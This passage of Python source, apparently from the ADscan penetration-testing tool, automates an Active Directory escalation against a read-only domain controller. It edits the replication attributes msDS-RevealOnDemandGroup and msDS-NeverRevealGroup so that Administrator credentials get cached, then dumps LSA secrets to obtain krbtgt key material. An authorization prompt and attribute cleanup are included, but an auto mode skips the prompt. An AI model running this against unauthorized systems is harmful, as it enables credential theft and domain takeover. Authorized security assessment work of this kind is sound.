            return False

        policy_actor = _select_rodc_policy_actor(
            shell,
            domain=domain,
            current_actor=username,
            candidates=list(object_control.get("candidates") or []),
        )
        selected_policy_actor = policy_actor.get("selected")
        if not isinstance(selected_policy_actor, dict):
            _print_rodc_object_control_guidance(
                domain=domain,
                target_label=str(object_control.get("target_label") or normalized_machine),
                actor_username=username,
                reason=str(policy_actor.get("reason") or "unknown"),
                candidates=list(policy_actor.get("candidates") or []),
            )
            return False

        policy_username = str(
            selected_policy_actor.get("credential_username")
            or selected_policy_actor.get("username")
            or username
        ).strip() or username
        policy_password = str(selected_policy_actor.get("credential_secret") or "").strip()
        policy_actor_label = str(
            selected_policy_actor.get("label")
            or selected_policy_actor.get("username")
            or policy_username
        ).strip() or policy_username
        tracking_from_label, tracking_to_label, tracking_notes = _build_rodc_prp_tracking_context(
            domain=domain,
            rodc_machine=normalized_machine,
            selected_policy_actor=selected_policy_actor,
            policy_actor_label=policy_actor_label,
        )

        domain_data = getattr(shell, "domains_data", {}).get(domain, {})
        pdc_host = str(
            domain_data.get("pdc_hostname_fqdn")
            or domain_data.get("pdc_hostname")
            or domain_data.get("pdc")
            or ""
        ).strip()
        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
        if not pdc_host or not bloody_path:
            print_error("RODC follow-up requires a reachable DC and bloodyAD.")
            return False

        default_target_user = str(
            domain_data.get("rodc_followup_default_user") or "Administrator"
        ).strip()
        print_operation_header(
            "RODC Follow-up",
            details={
                "Domain": domain,
                "RODC": normalized_machine,
                "Reachable Host": _first_hostname_candidate(
                    assessment,
                    fallback_host=normalized_machine.rstrip("$"),
                ),
                "LDAP Actor": policy_actor_label,
                "Host Actor": username,
            },
            icon="🧱",
        )
        if not getattr(shell, "auto", False):
            print_system_change_warning(
                title="[bold yellow]RODC Follow-up Warning[/bold yellow]",
                summary=(
                    "This follow-up changes the RODC object's password-replication policy in Active Directory. "
                    "ADscan will update LDAP attributes on the RODC object before attempting the follow-up."
                ),
                planned_changes=[
                    "Add the selected privileged account to msDS-RevealOnDemandGroup.",
                    "If needed, remove that account from msDS-NeverRevealGroup.",
                ],
                impact_notes=[
                    "This can allow privileged credentials to be replicated or cached on the RODC.",
                    f"ADscan will use {policy_actor_label} for the LDAP policy phase and {username} for the host-side dump phase.",
                    "ADscan will try to restore the original LDAP attribute values during cleanup.",
                ],
                cleanup_notes=[
                    "Cleanup restores the directory settings, but it may not undo credential material already cached on the RODC.",
                ],
                authorization_note=(
                    "Only continue if you are explicitly authorized to make temporary AD changes in this environment."
                ),
            )
            if not Confirm.ask(
                "Proceed with the RODC follow-up now?",
                default=False,
            ):
                print_info("Skipping RODC follow-up by user choice.")
                return False

        if getattr(shell, "auto", False):
            target_user = default_target_user
        else:
            selected_target_user = resolve_privileged_target_user(
                shell,
                domain=domain,
                purpose="RODC credential caching",
                require_domain_admin=True,
                exclude_not_delegated=False,
                exclude_protected_users=False,
            )
            if not selected_target_user:
                print_info("Skipping RODC follow-up by user choice.")
                return False
            target_user = selected_target_user
        preferred_host = _first_hostname_candidate(
            assessment,
            fallback_host=normalized_machine.rstrip("$"),
        )
        _print_rodc_followup_execution_plan(
            domain=domain,
            rodc_machine=normalized_machine,
            reachable_host=preferred_host,
            host_actor=username,
            ldap_actor_label=policy_actor_label,
            target_user=target_user,
        )

        service = ExploitationService()
        target_user_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=target_user,
        )
        if not target_user_dn:
            print_error(
                f"Could not resolve Distinguished Name for {mark_sensitive(target_user, 'user')}."
            )
            return False

        allowed_group_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=_RODC_ALLOWED_GROUP,
        )
        if not allowed_group_dn:
            allowed_group_dn = (
                f"CN={_RODC_ALLOWED_GROUP},CN=Users,{derive_base_dn(domain)}"
            )
            print_info_debug(
                "[rodc] Falling back to canonical DN for Allowed RODC Password Replication Group: "
                f"{mark_sensitive(allowed_group_dn, 'path')}"
            )

        rodc_dn, reveal_values, never_reveal_values = _load_rodc_attribute_state(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=policy_username,
            password=policy_password,
            target_object=normalized_machine,
        )
        if not rodc_dn:
            print_error(
                f"Could not read the RODC object state for {mark_sensitive(normalized_machine, 'user')}."
            )
            return False
        original_reveal_values = tuple(reveal_values)
        original_never_reveal_values = tuple(never_reveal_values)

        updated_reveal_values = _normalize_attr_values([*reveal_values, allowed_group_dn, target_user_dn])
        removed_from_never_reveal = False
        with active_step(
            shell,
            domain=domain,
            from_label=tracking_from_label,
            relation="ManageRODCPrp",
            to_label=tracking_to_label,
            notes=tracking_notes,
        ):
            update_active_step_status(
                shell,
                domain=domain,
                status="attempted",
                notes={
                    **tracking_notes,
                    "target_user": target_user,
                    "target_user_dn": target_user_dn,
                    "rodc_dn": rodc_dn,
                    "attribute_name": "msDS-RevealOnDemandGroup",
                    "attribute_values": updated_reveal_values,
                },
            )
            reveal_update = service.acl.set_object_attribute_values(
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=policy_username,
                password=policy_password,
                target_object=normalized_machine,
                attribute_name="msDS-RevealOnDemandGroup",
                attribute_values=updated_reveal_values,
                kerberos=True,
            )
            if not reveal_update.success:
                update_active_step_status(
                    shell,
                    domain=domain,
                    status="failed",
                    notes={
                        **tracking_notes,
                        "target_user": target_user,
                        "target_user_dn": target_user_dn,
                        "rodc_dn": rodc_dn,
                        "failed_attribute": "msDS-RevealOnDemandGroup",
                    },
                )
                print_error(
                    "Failed to update msDS-RevealOnDemandGroup on the RODC object."
                )
                return False
            cleanup_required = True

            if any(value.casefold() == target_user_dn.casefold() for value in never_reveal_values):
                updated_never_reveal_values = tuple(
                    value
                    for value in never_reveal_values
                    if value.casefold() != target_user_dn.casefold()
                )
                never_reveal_update = service.acl.set_object_attribute_values(
                    pdc_host=pdc_host,
                    bloody_path=bloody_path,
                    domain=domain,
                    username=policy_username,
                    password=policy_password,
                    target_object=normalized_machine,
                    attribute_name="msDS-NeverRevealGroup",
                    attribute_values=updated_never_reveal_values,
                    kerberos=True,
                )
                if not never_reveal_update.success:
                    update_active_step_status(
                        shell,
                        domain=domain,
                        status="failed",
                        notes={
                            **tracking_notes,
                            "target_user": target_user,
                            "target_user_dn": target_user_dn,
                            "rodc_dn": rodc_dn,
                            "failed_attribute": "msDS-NeverRevealGroup",
                        },
                    )
                    print_error(
                        "Failed to update msDS-NeverRevealGroup on the RODC object."
                    )
                    return False
                removed_from_never_reveal = True

            update_active_step_status(
                shell,
                domain=domain,
                status="success",
                notes={
                    **tracking_notes,
                    "target_user": target_user,
                    "target_user_dn": target_user_dn,
                    "rodc_dn": rodc_dn,
                    "updated_attributes": (
                        ("msDS-RevealOnDemandGroup", "msDS-NeverRevealGroup")
                        if removed_from_never_reveal
                        else ("msDS-RevealOnDemandGroup",)
                    ),
                },
            )

        marked_target_user = mark_sensitive(target_user, "user")
        marked_rodc = mark_sensitive(normalized_machine, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_success(
            f"RODC follow-up prepared password replication for {marked_target_user} on {marked_rodc} in {marked_domain} using {mark_sensitive(policy_actor_label, 'user')}."
        )
        summary_lines = [
            f"RODC object DN: {mark_sensitive(rodc_dn, 'path')}",
            f"Target account DN: {mark_sensitive(target_user_dn, 'path')}",
            f"LDAP policy actor: {mark_sensitive(policy_actor_label, 'user')}",
            f"RODC host actor: {mark_sensitive(username, 'user')}",
            "Updated attribute: msDS-RevealOnDemandGroup",
        ]
        if removed_from_never_reveal:
            summary_lines.append(
                "Updated attribute: msDS-NeverRevealGroup (target removed)"
            )
        print_panel(
            "\n".join(summary_lines),
            title="[bold green]RODC Follow-up Applied[/bold green]",
            border_style="green",
            expand=False,
        )

        if 445 in set(assessment.open_ports):
            _maybe_dump_rodc_lsa(
                shell,
                domain=domain,
                host=preferred_host,
                username=username,
                password=password,
            )
            _print_rodc_post_dump_guidance(host=preferred_host)
        else:
            print_info(
                f"Next step: authenticate to {mark_sensitive(preferred_host, 'hostname')} as {mark_sensitive(username, 'user')} and dump the RODC LSA secrets to recover the per-RODC krbtgt material (for example `krbtgt_<RODC number>`)."
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("RODC follow-up encountered an error.")
        print_info_debug(f"[rodc] escalation helper failed: {exc}")
        return False
    finally:
        if cleanup_required and service is not None and pdc_host and bloody_path:
            cleanup_completed = _restore_rodc_attribute_state(
                service,
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=policy_username,
                password=policy_password,
                target_object=normalized_machine,
                reveal_values=original_reveal_values,
                never_reveal_values=original_never_reveal_values,
            )
            marked_rodc = mark_sensitive(normalized_machine, "user")
            marked_domain = mark_sensitive(domain, "domain")
            if cleanup_completed:
                print_info(
                    f"RODC follow-up cleanup completed: restored the original password-replication attributes on {marked_rodc} in {marked_domain}."
                )
            else:
                _print_rodc_cleanup_manual_guidance(
                    domain=domain,
                    rodc_machine=normalized_machine,
                    reveal_values=original_reveal_values,
                    never_reveal_values=original_never_reveal_values,
                )
        try:
            execute_cleanup_scope(shell, scope_id=cleanup_scope_id)
        finally:
            discard_cleanup_scope(shell, scope_id=cleanup_scope_id)


__all__ = ["offer_rodc_escalation"]
